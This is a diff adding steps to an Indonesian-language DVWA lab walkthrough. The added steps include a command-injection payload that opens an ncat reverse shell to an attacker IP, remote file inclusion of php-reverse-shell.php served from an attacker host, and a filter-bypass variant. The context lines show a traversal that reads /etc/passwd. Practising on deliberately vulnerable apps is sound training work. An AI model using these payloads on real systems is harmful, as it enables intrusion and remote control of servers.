@@ -73,6 +73,9 @@ nc -lnvp 9999
 ```sh
 127.0.0.1& whoami& hostname
 ```
+```sh
+127.0.0.1& ncat <IP_Attacker> 9999 -e /bin/bash
+```
 
 ### Security Hard
 Di level ini kita hanya bisa mengeksekusi 1 perintah saja
@@ -132,6 +135,21 @@ http://<IP_Server>/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
 
 ![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%207.JPG)
 
+Menjalankan file **php-reverse-shell.php** ke server
+```sh
+python3 -m http.server 80
+```
+```sh
+nc -lnvp <port>
+```
+```sh
+http://<IP_Server>/DVWA/vulnerabilities/fi/?page=http://<IP_Attacker>/php-reverse-shell.php
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2034.JPG)
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2035.JPG)
+
 ### Security Medium
 ```sh
 http://<IP_Server>/DVWA/vulnerabilities/fi/?page=....//....//hackable/flags/fi.php
@@ -140,6 +158,11 @@ http://<IP_Server>/DVWA/vulnerabilities/fi/?page=....//....//hackable/flags/fi.p
 Membuka isi file **/etc/passwd** di server
 ```sh
 http://<IP_Server>/DVWA/vulnerabilities/fi/?page=....//....//....//....//....//....//etc/passwd
+```
+
+Menjalankan file **php-reverse-shell.php** ke server
+```sh
+http://<IP_Server>/DVWA/vulnerabilities/fi/?page=hthttp://tp://<IP_Attacker>/php-reverse-shell.php
 ```
 
 ### Security High
